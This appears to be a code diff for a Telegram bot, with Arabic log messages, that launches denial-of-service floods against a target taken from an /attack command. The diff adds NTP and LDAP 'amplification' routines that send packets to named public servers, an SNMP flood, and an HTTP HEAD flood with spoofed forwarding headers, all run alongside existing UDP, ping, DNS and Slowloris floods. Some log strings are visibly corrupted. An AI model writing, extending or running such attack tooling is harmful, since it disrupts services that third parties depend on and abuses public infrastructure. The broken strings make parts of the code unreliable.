@@ -161,7 +161,7 @@ def udp_flood(target_ip, target_port):
                 sock.sendto(packet, (target_ip, target_port))
                 attack_counter += 1
     except Exception as e:
-        log_error_once(f"حدث خطأ في udp_flood: {e}\nتفاصيل الخطأ: {str(e)}")
+        log_error_once(f"حدث خطأ في udp_flood: {e}\ن تفاصیل الخطأ: {str(e)}")
 
 def ping_flood(target_ip):
     global attack_in_progress, attack_counter
@@ -171,7 +171,7 @@ def ping_flood(target_ip):
             send(packet, verbose=0)
             attack_counter += 1
     except Exception as e:
-        log_error_once(f"حدث خطأ في ping_flood: {e}\nتفاصيل الخطأ: {str(e)}")
+        log_error_once(f"حدث خطأ في ping_flood: {e}\ن تفاصیل الخطأ: {str(e)}")
 
 def dns_flood(target_ip):
     global attack_in_progress, attack_counter
@@ -181,7 +181,7 @@ def dns_flood(target_ip):
             send(query, verbose=0)
             attack_counter += 1
     except Exception as e:
-        log_error_once(f"حدث خطأ في dns_flood: {e}\nتفاصيل الخطأ: {str(e)}")
+        log_error_once(f"حدث خطأ في dns_flood: {e}\ن تفاصیل الخطأ: {str(e)}")
 
 def slowloris_attack(target_ip, target_port):
     global attack_in_progress, attack_counter
@@ -197,7 +197,56 @@ def slowloris_attack(target_ip, target_port):
             attack_counter += 1
             time.sleep(15)  # إبقاء الاتصال مفتوحًا لفترة طويلة
     except Exception as e:
-        log_error_once(f"حدث خطأ في slowloris_attack: {e}\nتفاصيل الخطأ: {str(e)}")
+        log_error_once(f"حدث خطأ في slowloris_attack: {e}\ن تفاصیل الخطأ: {str(e)}")
+
+def ntp_amplification(target_ip):
+    global attack_in_progress, attack_counter
+    ntp_server = "pool.ntp.org"
+    ntp_packet = b'\x17' + 47 * b'\x00'
+    try:
+        while attack_in_progress:
+            with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as sock:
+                sock.sendto(ntp_packet, (ntp_server, 123))
+                sock.sendto(ntp_packet, (target_ip, 123))
+                attack_counter += 1
+    except Exception as e:
+        log_error_once(f"حدث خطأ في ntp_amplification: {e}\ن تفاصیل الخطأ: {str(e)}")
+
+def ldap_amplification(target_ip):
+    global attack_in_progress, attack_counter
+    ldap_server = "ldap.forumsys.com"
+    ldap_packet = b'\x30\x84\x00\x00\x00\x0b\x02\x01\x01\x60\x84\x00\x00\x00\x03\x02\x01\x03'
+    try:
+        while attack_in_progress:
+            with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as sock:
+                sock.sendto(ldap_packet, (ldap_server, 389))
+                sock.sendto(ldap_packet, (target_ip, 389))
+                attack_counter += 1
+    except Exception as e:
+       
+        log_error_once("حدث خطأ في ldap_amplification: {e}\ن تفاصیل الخطأ: {str(e)}")
+
+def snmp_flood(target_ip):
+    global attack_in_progress, attack_counter
+    snmp_packet = b'\x30\x29\x02\x01\x00\x04\x06\x70\x75\x62\x6c\x69\x63\xa1\x1c\x02\x04\x00\x00\x00\x00\x02\x01\x00\x02\x01\x00\x30\x0e\x30\x0c\x06\x08\x2b\x06\x01\x02\x01\x01\x01\x00\x05\x00'
+    try:
+        while attack_in_progress:
+            with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as sock:
+                sock.sendto(snmp_packet, (target_ip, 161))
+                attack_counter += 1
+    except Exception as e:
+        log_error_once(f"حدث خطأ في snmp_flood: {e}\ن تفاصیل الخطأ: {str(e)}")
+
+def http_head_flood(host):
+    global attack_in_progress, attack_counter
+    try:
+        while attack_in_progress:
+            request = f"HEAD / HTTP/1.1\r\nHost: {host}\r\nUser-Agent: {random_user_agent()}\r\nX-Forwarded-For: {random_ip()}\r\n\r\n".encode('utf-8')
+            with socket.create_connection((host, 80)) as sock:
+                sock.sendall(request)
+                attack_counter += 1
+    except Exception as e:
+        log_error_once(f"حدث خطأ في http_head_flood: {e}\ن تفاصیل الخطأ: {str(e)}")
 
 @bot.message_handler(commands=['start'])
 def send_welcome(message):
@@ -250,6 +299,10 @@ def start_attack(message):
                     executor.submit(ping_flood, target_ip)
                     executor.submit(dns_flood, target_ip)
                     executor.submit(slowloris_attack, target_ip, 80)
+                    executor.submit(ntp_amplification, target_ip)
+                    executor.submit(ldap_amplification, target_ip)
+                    executor.submit(snmp_flood, target_ip)
+                    executor.submit(http_head_flood, host)
         except IndexError:
             bot.reply_to(message, "استخدم /attack <الرابط>")
     else:
